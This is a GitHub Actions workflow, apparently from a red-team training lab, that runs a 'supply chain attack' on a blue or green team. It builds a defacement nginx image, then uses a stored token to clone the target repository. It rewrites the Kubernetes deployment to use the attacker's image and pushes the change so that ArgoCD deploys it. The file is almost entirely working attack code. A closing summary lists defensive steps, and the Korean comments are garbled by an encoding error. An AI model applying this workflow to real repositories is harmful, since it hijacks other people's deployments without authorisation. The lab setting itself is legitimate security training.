name: "Color Change Attack"

on:
  workflow_dispatch:
    inputs:
      target_team:
        description: 'Target team (blue/green)'
        required: true
        default: 'blue'
        type: choice
        options:
          - blue
          - green
      target_color:
        description: 'Change color to'
        required: true
        default: 'red'
        type: choice
        options:
          - red

permissions:
  contents: write
  id-token: write
  packages: write

jobs:
  color_attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup target repository
        id: setup
        run: |
          case "${{ github.event.inputs.target_team }}" in
            "blue")
              echo "target_repo=slsa-lab-blue/application" >> $GITHUB_OUTPUT
              echo "target_image=ghcr.io/slsa-lab-blue/application" >> $GITHUB_OUTPUT
              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
              echo "deployment_file=k8s/deployment.yaml" >> $GITHUB_OUTPUT
              ;;
            "green")
              echo "target_repo=slsa-lab-green/application" >> $GITHUB_OUTPUT
              echo "target_image=ghcr.io/slsa-lab-green/application" >> $GITHUB_OUTPUT
              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
              echo "deployment_file=k8s/deployment-recovery.yaml" >> $GITHUB_OUTPUT
              ;;
          esac

      - name: Set up buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.G_TOKEN }}

      - name: Create color-changed image
        run: |
          cat > Dockerfile.color << 'EOF'
          FROM nginx:alpine
          
          # ìƒ‰ìƒ ë³€ê²½ëœ ì›¹ í˜ì´ì§€ ìƒì„±
          RUN echo '<!DOCTYPE html>' > /usr/share/nginx/html/index.html && \
              echo '<html><head><title>Compromised by Red Team</title></head>' >> /usr/share/nginx/html/index.html && \
              echo '<body style="background-color: ${{ github.event.inputs.target_color }}; color: white; text-align: center; padding-top: 200px;">' >> /usr/share/nginx/html/index.html && \
              echo '<h1>ğŸš¨ COMPROMISED by RED TEAM ğŸš¨</h1>' >> /usr/share/nginx/html/index.html && \
              echo '<h2>Color changed to: ${{ github.event.inputs.target_color }}</h2>' >> /usr/share/nginx/html/index.html && \
              echo '<p>Original team: ${{ github.event.inputs.target_team }}</p>' >> /usr/share/nginx/html/index.html && \
              echo '<p>Attack time: '$(date)' </p>' >> /usr/share/nginx/html/index.html && \
              echo '</body></html>' >> /usr/share/nginx/html/index.html
          
          EXPOSE 80
          CMD ["nginx", "-g", "daemon off;"]
          EOF

      - name: Build and push color-changed image
        uses: docker/build-push-action@v6
        id: build
        with:
          context: .
          file: Dockerfile.color
          push: true
          tags: |
            ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack
            ${{ steps.setup.outputs.attack_image }}:compromised-${{ github.sha }}
            ${{ steps.setup.outputs.attack_image }}:latest
          build-args: |
            TEAM=red-team-attack
            COLOR=${{ github.event.inputs.target_color }}

      - name: Clone target repository
        env:
          GH_TOKEN: ${{ secrets.G_TOKEN }}
        run: |
          git clone https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
          cd target_repo
          git config user.name "red-team-attack"
          git config user.email "attack@red-team.com"
          git remote set-url origin https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git

      - name: Modify deployment with new color image
        env:
          GH_TOKEN: ${{ secrets.G_TOKEN }}
        run: |
          cd target_repo
          
          echo "ğŸ¯ Starting deployment modification attack..."
          echo "Target team: ${{ github.event.inputs.target_team }}"
          echo "Attack image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
          
          # Blue Team ê³µê²© - deployment.yaml ìˆ˜ì •
          if [ "${{ github.event.inputs.target_team }}" == "blue" ]; then
            echo "ğŸ”µ Attacking Blue Team deployment..."
            
            # ê¸°ì¡´ ì´ë¯¸ì§€ ë°±ì—…
            grep "image:" k8s/deployment.yaml > /tmp/original_image.txt || true
            echo "Original image: $(cat /tmp/original_image.txt)"
            
            # ìš°ë¦¬ì˜ ì•…ì„± ì´ë¯¸ì§€ë¡œ êµì²´
            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment.yaml
            
            # ìƒ‰ìƒ í™˜ê²½ë³€ìˆ˜ ì£¼ì…
            if ! grep -q "TEAM_COLOR" k8s/deployment.yaml; then
              sed -i '/ports:/i\
                  env:\
                    - name: TEAM_COLOR\
                      value: "${{ github.event.inputs.target_color }}"\
                    - name: ATTACK_STATUS\
                      value: "COMPROMISED_BY_RED_TEAM"' k8s/deployment.yaml
            else
              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment.yaml
            fi
            
            echo "âœ… Blue Team deployment.yaml modified successfully"
          fi
          
          # Green Team ê³µê²© - deployment-recovery.yaml ìˆ˜ì •
          if [ "${{ github.event.inputs.target_team }}" == "green" ]; then
            echo "ğŸŸ¢ Attacking Green Team deployment..."
            
            # ê¸°ì¡´ ì´ë¯¸ì§€ ë°±ì—…
            grep "image:" k8s/deployment-recovery.yaml > /tmp/original_image.txt || true
            echo "Original image: $(cat /tmp/original_image.txt)"
            
            # ìš°ë¦¬ì˜ ì•…ì„± ì´ë¯¸ì§€ë¡œ êµì²´
            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment-recovery.yaml
            
            # ë³´ì•ˆ ì»¨í…ìŠ¤íŠ¸ëŠ” ìœ ì§€í•˜ë˜ í™˜ê²½ë³€ìˆ˜ ì¶”ê°€
            if ! grep -q "TEAM_COLOR" k8s/deployment-recovery.yaml; then
              sed -i '/ports:/i\
                  env:\
                    - name: TEAM_COLOR\
                      value: "${{ github.event.inputs.target_color }}"\
                    - name: ATTACK_STATUS\
                      value: "COMPROMISED_BY_RED_TEAM"\
                    - name: ORIGINAL_TEAM\
                      value: "green"' k8s/deployment-recovery.yaml
            else
              sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment-recovery.yaml
            fi
            
            echo "âœ… Green Team deployment-recovery.yaml modified successfully"
          fi
          
          # ë³€ê²½ì‚¬í•­ í™•ì¸
          echo "ğŸ” Deployment changes:"
          git diff
          
          echo "ğŸ“‹ Modified files:"
          git status --porcelain
          
          # ë³€ê²½ì‚¬í•­ì´ ìˆì„ ë•Œë§Œ ì»¤ë°‹
          if [ -n "$(git status --porcelain)" ]; then
            git add .
            git commit -m "ğŸš¨ SUPPLY CHAIN ATTACK: ${{ github.event.inputs.target_team }} team compromised by Red Team - Color changed to ${{ github.event.inputs.target_color }}"
            
            echo "ğŸš€ Pushing attack to target repository..."
            # ì¬ì‹œë„ ë¡œì§ìœ¼ë¡œ ì•ˆì „í•˜ê²Œ push
            for i in {1..3}; do
              if git push; then
                echo "âœ… Successfully pushed attack changes on attempt $i"
                echo "ğŸ¯ Target team deployment now uses our malicious image!"
                break
              else
                echo "âŒ Push failed on attempt $i, retrying..."
                sleep 2
              fi
            done
          else
            echo "âš ï¸ No changes detected to commit"
          fi

      - name: Attack summary
        run: |
          echo "ğŸ¯ SUPPLY CHAIN ATTACK COMPLETED!"
          echo "================================="
          echo "Target Team: ${{ github.event.inputs.target_team }}"
          echo "Color Changed To: ${{ github.event.inputs.target_color }}"
          echo "Attack Image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
          echo "Target Repository: ${{ steps.setup.outputs.target_repo }}"
          echo ""
          echo "ğŸš¨ CRITICAL: Target team deployment now uses OUR malicious image!"
          echo ""
          echo "âœ… Attack Vector: GitOps Supply Chain Compromise"
          echo "âœ… Method: Direct Repository Deployment Modification"
          echo "âœ… Result: Enemy team will deploy our compromised container!"
          echo ""
          echo "ğŸ” When the target team syncs their ArgoCD:"
          echo "   - Their pods will restart with our image"
          echo "   - Background color will change to: ${{ github.event.inputs.target_color }}"
          echo "   - Message: 'COMPROMISED by RED TEAM' will be displayed"
          echo "   - Their original application is completely replaced"
          echo ""
          echo "âš ï¸  This demonstrates a critical supply chain vulnerability!"
          echo "ğŸ“‹ Target team needs to:"
          echo "   1. Check their deployment files immediately"
          echo "   2. Verify image signatures"
          echo "   3. Implement admission controllers"
          echo "   4. Monitor for unauthorized repository changes"